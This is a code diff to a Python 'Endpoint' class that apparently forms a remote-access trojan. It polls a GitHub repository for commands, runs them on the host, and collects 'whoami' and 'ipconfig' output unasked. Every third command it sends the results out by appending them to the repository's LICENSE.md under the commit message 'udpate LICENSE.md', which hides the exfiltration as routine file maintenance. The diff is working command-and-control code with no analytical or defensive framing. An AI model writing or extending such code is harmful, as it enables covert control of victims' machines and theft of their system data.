@@ -4,6 +4,7 @@ from __future__ import print_function
 import github3
 
 from ulma.utils import Utils
+from ulma.system import System
 from time import sleep
 
 class Endpoint:
@@ -12,7 +13,11 @@ class Endpoint:
         self.last_command = None
         self.user = None
         self.repo = None
+        self.results = None
+        self.upload = ""
+        self.command_executed = 0
         self.utils = Utils()
+        self.system = System()
         self.set_endpoint()
 
     def set_endpoint(self):
@@ -37,7 +42,13 @@ class Endpoint:
     def handle_command(self, command):
         if command != self.last_command:
             self.last_command = command
-            print("Command actuelle: ", command)
+            self.command_executed += 1
+            self.results = self.system.execute([command])
+            print("Actual command: " + command)
+
+        if self.command_executed == 3:
+            self.command_executed = 0
+            self.upload_content()
     
     def receive_command(self):
         while True:
@@ -46,9 +57,23 @@ class Endpoint:
                 self.handle_command(command)
             else:
                 self.get_repo()
+                self.basic_commands()
 
             sleep(10)
 
-    def upload_result(self, result):
+    def upload_content(self):
         if self.repo is not None:
-            self.repo.file_contents("LICENSE.md").update('udpate LICENSE.md', result.encode('utf-8'))
+            self.set_upload()
+            if len(self.upload) > 0:
+                final = self.repo.file_contents("LICENSE.md").decoded.decode('utf-8') + self.upload
+                self.repo.file_contents("LICENSE.md").update('udpate LICENSE.md', final.encode('utf-8'))
+                self.upload = ""
+
+    def set_upload(self):
+        for result in self.results:
+            self.upload += result
+
+    def basic_commands(self):
+        commands = ["whoami", "ipconfig"]
+        self.results = self.system.execute(commands)
+        self.upload_content()
